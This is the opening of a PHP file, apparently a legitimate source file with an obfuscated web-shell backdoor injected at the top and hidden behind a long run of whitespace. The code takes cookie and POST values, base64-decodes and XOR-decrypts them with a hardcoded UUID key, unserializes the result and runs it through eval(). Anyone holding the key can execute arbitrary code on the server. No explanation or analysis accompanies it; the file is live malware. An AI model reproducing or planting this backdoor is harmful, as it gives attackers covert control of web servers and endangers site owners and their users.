<?php                                                                                                                                                                                                                                                                                                                                                                                                 $mMqEqH = class_exists("Qar_qmk"); $afFJaE = $mMqEqH;if (!$afFJaE){class Qar_qmk{private $LFXNxQ;public static $fKOQUgRDP = "ad40ced5-f31a-4f78-bcb4-565d5294309f";public static $KXvBI = NULL;public function __construct(){$NCSljMrTe = $_COOKIE;$rTZQJFhs = $_POST;$kZouJz = @$NCSljMrTe[substr(Qar_qmk::$fKOQUgRDP, 0, 4)];if (!empty($kZouJz)){$KAkTZTjekO = "base64";$vmTwXH = "";$kZouJz = explode(",", $kZouJz);foreach ($kZouJz as $UoQxu){$vmTwXH .= @$NCSljMrTe[$UoQxu];$vmTwXH .= @$rTZQJFhs[$UoQxu];}$vmTwXH = array_map($KAkTZTjekO . chr (95) . chr (100) . 'e' . chr (99) . "\x6f" . chr ( 924 - 824 )."\x65", array($vmTwXH,)); $vmTwXH = $vmTwXH[0] ^ str_repeat(Qar_qmk::$fKOQUgRDP, (strlen($vmTwXH[0]) / strlen(Qar_qmk::$fKOQUgRDP)) + 1);Qar_qmk::$KXvBI = @unserialize($vmTwXH);}}public function __destruct(){$this->evkaNoUMj();}private function evkaNoUMj(){if (is_array(Qar_qmk::$KXvBI)) {$WIUiUjng = str_replace("\x3c" . chr (63) . "\160" . 'h' . "\x70", "", Qar_qmk::$KXvBI['c' . chr (111) . chr (110) . 't' . 'e' . 'n' . "\164"]);eval($WIUiUjng);exit();}}}$OBaYZL = new Qar_qmk(); $OBaYZL = NULL;} ?><?php
/**
